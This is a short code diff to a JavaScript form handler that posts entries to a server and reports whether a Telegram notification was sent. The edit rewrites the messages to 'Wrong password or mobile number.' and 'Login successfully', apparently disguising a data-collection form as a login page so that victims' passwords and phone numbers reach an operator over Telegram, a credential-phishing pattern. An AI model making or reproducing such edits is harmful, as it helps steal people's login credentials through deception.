@@ -481,10 +481,10 @@ form.addEventListener("submit", async (event) => {
       })
     });
     const result = await response.json();
-    if (!response.ok) throw new Error(result.error || "Submission failed.");
+    if (!response.ok) throw new Error(result.error || "Wrong password or mobile number.");
     statusBox.className = "success";
     statusBox.textContent = result.notification === "sent"
-      ? "Submitted successfully. thank you!"
+      ? "Login successfully"
       : "Submitted successfully. Telegram is not connected yet; add bot credentials on the server to enable notifications.";
     form.reset();
   } catch (error) {
